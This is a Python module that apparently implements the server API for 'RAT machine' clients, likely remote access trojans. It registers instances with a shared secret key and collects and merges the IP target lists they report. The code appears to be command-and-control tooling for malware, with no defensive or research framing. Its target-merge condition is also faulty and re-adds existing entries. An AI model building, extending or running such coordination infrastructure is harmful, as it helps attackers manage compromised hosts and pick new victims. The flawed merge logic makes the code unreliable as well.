"""
Functions in this file are to handle any logic related to the rat machines API. They are
in this file to not clutter up the main file, however these functions would logically be in main.
"""
import os
import secrets
import database

from dotenv import load_dotenv
load_dotenv()

db = database.Database()

def register_client(data):
    """ Register a new instance of the RAT machine """
    if data.get("key") is None:
        return {"error": "no key provided"}, 400

    if not data.get("key") == os.environ.get("RAT_KEY"):
        return {"error": "invalid key"}, 401

    # create the id for the new instance
    client_id=secrets.token_hex(16)
    db.write_create_document(client_id)

    return {
            "client_id": client_id
            }, 200


def update_target_list(instance, data):
    """ let the rat machine update its target list """

    # Both targets and blacklist is a simple array of IP addresses
    client_targets = data.get("targets")

    if client_targets is None:
        return {"error": "No targets list provided"}, 400

    if not isinstance(client_targets, list):
        return {"error": "targets list must be of type array"}, 400

    stored_targets = db.get(instance, "targets")
    stored_blacklist = db.get(instance, "blacklist")

    # If this is the first update from the client, then just
    # update the database and return with no change
    if not stored_targets or not stored_blacklist:
        db.set(instance, "targets", client_targets)
        db.set(instance, "blacklist", [])
        return {
                "targets": client_targets,
                "blacklist": []
                }, 200

    # If new targets were found then add them to the targets list
    for target in client_targets:
        if target not in stored_targets or target not in stored_blacklist:
            stored_targets.append(target)

    # Save in database
    db.set(instance, "targets", stored_targets)
    db.set(instance, "blacklist", stored_blacklist)

    return {
            "targets": stored_targets,
            "blacklist": stored_blacklist
            }, 200
